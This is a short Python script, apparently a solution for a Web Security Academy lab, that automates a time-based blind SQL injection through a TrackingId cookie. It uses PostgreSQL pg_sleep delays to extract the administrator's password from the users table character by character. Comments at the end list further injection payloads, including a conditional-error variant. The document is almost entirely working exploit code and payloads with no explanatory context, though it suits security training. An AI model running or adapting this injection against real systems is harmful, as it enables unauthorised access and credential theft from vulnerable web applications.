import requests
import string
import datetime as dt

url = "https://{your-instance}.web-security-academy.net/"

alphabet = string.ascii_lowercase + "1234567890"

payload = ""
password = ""
num=1
delta = dt.timedelta(
    seconds=3
)


s = requests.Session()

while True:
    for i in alphabet:
        payload = password + i

        track = {
            "TrackingId": f"x'%3b+SELECT+CASE+WHEN+(username+%3d+'administrator'+AND+SUBSTRING(password,+1,+{num})+%3d+'{payload}')+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END+FROM+users--"  
        }   
        
        print(track)
        r = s.get(url,cookies=track)
        print(r.elapsed)
        if r.elapsed > delta:
            password = password + i
            print(i, "||", "True")
            num     += 1
        else:
            print("False", print(r.status_code))


#S9nljSP73LcwoLgN' UNION SELECT CASE WHEN (Username = 'administrator' AND SUBSTR(Password, 1, 1) = 'm') THEN TO_CHAR(1/0) ELSE NULL END FROM users--
#x'%3b+SELECT+CASE+WHEN+(username+%3d+'administrator'+AND+SUBSTRING(password,+1,+1)+%3d+'m')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
#x'; SELECT CASE WHEN (username = 'administrator' AND SUBSTRING(password, 1, 1) > 'a') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
#x'%3b+SELECT+CASE+WHEN+(username+%3d+'administrator'+AND+SUBSTRING(password,+1,+1)+<+'a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
